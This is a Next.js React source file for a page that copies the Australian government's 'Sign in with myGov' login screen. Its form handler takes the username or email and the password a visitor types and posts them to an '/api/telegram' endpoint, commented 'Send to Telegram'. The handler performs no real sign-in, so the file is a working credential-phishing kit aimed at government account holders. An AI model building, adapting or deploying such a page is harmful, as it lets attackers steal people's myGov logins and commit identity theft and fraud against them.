"use client"

import FormInput from '@/components/signin/FormInput';
import Link from 'next/link';
import { useState } from 'react';

export default function SignInOptions() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Send to Telegram
    try {
      const res = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const result = await res.json();
      if (result.success) {
        console.log("Telegram notification sent!");
      } else {
        console.error("Telegram error:", result.error);
      }
    } catch (err) {
      console.error("Telegram fetch failed:", err);
    }
  };

  return (
    <div className="space-y-6">
      <div className='pt-3' />
      <Link href={'/signin'}>
        <p className='flex items-center underline text-[#254a7e] hover:bg-[#172f50] font-bold text-1xl'>
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" className="size-4">
            <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 19.5 8.25 12l7.5-7.5" />
          </svg>
          Back
        </p>
      </Link>

      <h2 className="text-[2rem] font-bold text-gray-700">Sign in with myGov</h2>
      <p className="text-gray-600">Choose how to sign in</p>

      <div className="space-y-3">
        <button className="w-full py-3 px-4 border border-gray-300 bg-[#66d3ee] hover:bg-[#254a7e] hover:text-white font-bold rounded-md text-[#172f50]">
          Sign in with Digital ID
        </button>

        <button className="w-full py-3 px-4 border border-gray-300 bg-[#66d3ee] hover:bg-[#254a7e] hover:text-white font-bold rounded-md text-[#172f50]">
          Sign in with passkey
        </button>

        <div className="flex items-center justify-center space-x-2">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="text-gray-500">or</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>

        <h2 className="text-[1.5rem] font-bold text-gray-700">Use your myGov sign in details</h2>
        <form onSubmit={handleSubmit} className="space-y-3" method='POST'>
          <div className="space-y-4">
            <FormInput
              id="username"
              label="Username or email"
              type="text"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              forgotLink={{ text: "Forgot username", href: "#" }}
            />
            <FormInput
              id="password"
              label="Password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              showToggle={true}
              forgotLink={{ text: "Forgot password", href: "#" }}
            />
            <button type="submit" className="w-full py-3 px-4 bg-[#66d3ee] hover:bg-[#254a7e] text-[#172f50] hover:text-white font-bold rounded-md">
              Sign in
            </button>
          </div>
        </form>
      </div>

      <p className="flex items-left text-left justify-center text-black">
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth="1.5" stroke="currentColor" className="size-5">
          <path strokeLinecap="round" strokeLinejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
        </svg>
        <Link href={'/'} className={'underline text-[#172f50] px-2 pb-20'}>
          Create a myGov account
        </Link> if you don&apos;t have one already.
      </p>
    </div>
  );
}
